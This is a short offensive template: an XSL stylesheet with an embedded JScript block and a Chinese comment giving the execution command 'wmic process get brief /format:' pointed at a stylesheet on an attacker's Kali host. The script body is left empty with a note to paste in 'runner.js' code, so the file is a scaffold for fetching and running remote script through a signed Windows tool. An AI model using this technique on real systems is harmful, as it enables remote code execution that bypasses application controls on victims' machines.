// 执行方法 : wmic process get brief /format:"http://My-Kali-IP/test.xsl"
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
 
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			// 这里复制 runner.js 的代码
		]]>
	</ms:script>
</stylesheet>